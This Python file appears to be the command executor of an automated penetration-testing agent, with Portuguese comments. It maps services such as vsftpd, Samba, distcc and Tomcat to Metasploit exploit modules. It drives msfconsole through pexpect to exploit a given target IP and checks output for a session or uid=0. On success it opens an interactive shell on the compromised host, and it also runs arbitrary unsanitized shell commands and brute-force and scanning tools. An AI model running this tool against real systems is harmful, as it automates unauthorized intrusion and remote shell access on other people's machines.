"""
Executor inteligente de comandos
"""

import re
import time
import asyncio
import subprocess
from typing import Tuple, Optional, Dict, Any


# Padrões que indicam necessidade de PTY
PTY_PATTERNS = [
    r"msfconsole",
    r"^ftp\s+\d+\.\d+\.\d+\.\d+\s*$",
    r"^ssh\s+\w+@",
    r"^telnet\s+",
    r"^nc\s+-l",
]

# Exploits conhecidos
KNOWN_EXPLOITS = {
    "vsftpd": "exploit/unix/ftp/vsftpd_234_backdoor",
    "samba": "exploit/multi/samba/usermap_script",
    "distcc": "exploit/unix/misc/distcc_exec",
    "unrealirc": "exploit/unix/irc/unreal_ircd_3281_backdoor",
    "java_rmi": "exploit/multi/misc/java_rmi_server",
    "tomcat": "exploit/multi/http/tomcat_mgr_upload",
    "postgres": "exploit/linux/postgres/postgres_payload",
    "mysql": "exploit/multi/mysql/mysql_udf_payload",
}


def needs_pty(command: str) -> bool:
    """Verifica se comando precisa de PTY"""
    cmd_lower = command.lower()
    
    # Exploits conhecidos
    for key in KNOWN_EXPLOITS:
        if key in cmd_lower:
            return True
    
    # Padrões interativos
    for pattern in PTY_PATTERNS:
        if re.search(pattern, cmd_lower):
            return True
    
    return False


def detect_exploit(command: str) -> Optional[str]:
    """Detecta tipo de exploit no comando"""
    cmd_lower = command.lower()
    
    for key, module in KNOWN_EXPLOITS.items():
        if key in cmd_lower or module in cmd_lower:
            return key
    
    return None


async def execute_command(
    command: str,
    timeout: int = 180,
    cwd: str = None
) -> Tuple[str, bool]:
    """
    Executa comando via subprocess.
    
    Args:
        command: Comando a executar
        timeout: Timeout em segundos
        cwd: Diretório de trabalho
        
    Returns:
        Tupla (output, success)
    """
    try:
        proc = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd
        )
        
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(),
            timeout=timeout
        )
        
        output = stdout.decode() + stderr.decode()
        success = proc.returncode == 0
        
        # Ajusta sucesso para ferramentas específicas
        output_lower = output.lower()
        cmd_lower = command.lower()
        
        if "nmap" in cmd_lower and "nmap scan report" in output_lower:
            success = True
        elif "hydra" in cmd_lower and ("valid password" in output_lower or "[data]" in output_lower):
            success = True
        elif "nikto" in cmd_lower and "server:" in output_lower:
            success = True
        elif "gobuster" in cmd_lower and "status:" in output_lower:
            success = True
        elif "searchsploit" in cmd_lower and ("exploits" in output_lower or "shellcodes" in output_lower):
            success = True
        
        return output.strip(), success
        
    except asyncio.TimeoutError:
        return f"TIMEOUT after {timeout}s", False
    except Exception as e:
        return f"ERROR: {e}", False


async def execute_with_pty(
    command: str,
    target: str,
    timeout: int = 120,
    interactive: bool = True
) -> Tuple[str, bool]:
    """
    Executa comando usando PTY para interação real.
    
    Args:
        command: Comando ou nome do exploit
        target: IP do alvo
        timeout: Timeout
        interactive: Se deve abrir shell interativa
        
    Returns:
        Tupla (output, success)
    """
    import pexpect
    
    output_lines = []
    success = False
    
    exploit_key = detect_exploit(command)
    
    if exploit_key and exploit_key in KNOWN_EXPLOITS:
        module = KNOWN_EXPLOITS[exploit_key]
        
        print(f"[PTY] Iniciando msfconsole para {exploit_key}...")
        
        child = pexpect.spawn('msfconsole -q', encoding='utf-8', timeout=60)
        
        try:
            # Aguarda prompt
            child.expect(['msf.*>', 'msf'], timeout=30)
            output_lines.append("[+] msfconsole iniciado")
            
            # Configura exploit
            commands = [
                f"use {module}",
                f"set RHOSTS {target}",
                "exploit"
            ]
            
            for cmd in commands:
                print(f"[PTY] > {cmd}")
                child.sendline(cmd)
                
                if cmd in ['exploit', 'run']:
                    time.sleep(2)
                else:
                    child.expect(['msf.*>', 'msf'], timeout=15)
                
                output_lines.append(f"> {cmd}")
                if child.before:
                    output_lines.append(child.before)
            
            # Aguarda resultado
            print("[PTY] Aguardando resultado...")
            time.sleep(10)
            
            try:
                child.expect([pexpect.TIMEOUT], timeout=5)
            except:
                pass
            
            if child.before:
                output_lines.append(child.before)
                full_output = child.before.lower()
                
                # Verifica sucesso
                success_patterns = ["session", "opened", "shell", "uid=0"]
                for pattern in success_patterns:
                    if pattern in full_output:
                        success = True
                        print(f"[PTY] Exploit bem-sucedido! Padrão: {pattern}")
                        break
            
            # Shell interativa
            if success and interactive:
                # Cores
                GREEN = "\033[38;5;42m"
                CYAN = "\033[38;5;45m"
                RED = "\033[38;5;196m"
                YELLOW = "\033[38;5;220m"
                BOLD = "\033[1m"
                RESET = "\033[0m"
                
                print(f"\n{GREEN}{'='*60}{RESET}")
                print(f"{GREEN}{BOLD}[+] SHELL OBTIDA COM SUCESSO!{RESET}")
                print(f"{GREEN}{'='*60}{RESET}")
                print(f"{CYAN}[*]{RESET} Target: {YELLOW}{target}{RESET}")
                print(f"{CYAN}[*]{RESET} Exploit: {YELLOW}{exploit_key}{RESET}")
                print(f"{GREEN}{'='*60}{RESET}")
                print(f"{CYAN}[*]{RESET} Você está na shell do alvo!")
                print(f"{CYAN}[*]{RESET} Pressione {RED}Ctrl+]{RESET} para sair")
                print(f"{GREEN}{'='*60}{RESET}\n")
                
                child.interact()
                
                output_lines.append("[+] SHELL_SESSION_COMPLETED")
                print(f"\n{GREEN}[+]{RESET} Shell encerrada. Objetivo alcançado!")
            
            elif success:
                # Coleta info
                child.sendline('whoami')
                time.sleep(1)
                try:
                    child.expect([pexpect.TIMEOUT], timeout=3)
                except:
                    pass
                if child.before:
                    output_lines.append(f"whoami: {child.before}")
                
                child.sendline('exit')
            
            else:
                child.sendline('exit')
            
        except pexpect.TIMEOUT:
            output_lines.append("[TIMEOUT]")
        except pexpect.EOF:
            output_lines.append("[EOF]")
        except KeyboardInterrupt:
            output_lines.append("[*] Interrompido")
            if success:
                output_lines.append("[+] SHELL_SESSION_COMPLETED")
        finally:
            if child.isalive():
                child.close()
    
    else:
        # Comando genérico com PTY
        output, success = await execute_command(command, timeout)
        output_lines.append(output)
    
    return "\n".join(output_lines), success


async def smart_execute(
    command: str,
    target: str = None,
    timeout: int = 180,
    interactive: bool = True
) -> Tuple[str, bool]:
    """
    Executa comando de forma inteligente.
    
    Detecta automaticamente se precisa de PTY ou subprocess.
    
    Args:
        command: Comando a executar
        target: IP do alvo
        timeout: Timeout
        interactive: Se deve abrir shell interativa
        
    Returns:
        Tupla (output, success)
    """
    if needs_pty(command):
        print(f"[SMART] Usando PTY para comando interativo")
        return await execute_with_pty(command, target, timeout, interactive)
    else:
        print(f"[SMART] Usando subprocess")
        return await execute_command(command, timeout)


# Versão síncrona para compatibilidade
def smart_execute_sync(
    command: str,
    target: str = None,
    timeout: int = 180,
    interactive: bool = True
) -> Tuple[str, bool]:
    """Versão síncrona do smart_execute"""
    return asyncio.run(smart_execute(command, target, timeout, interactive))
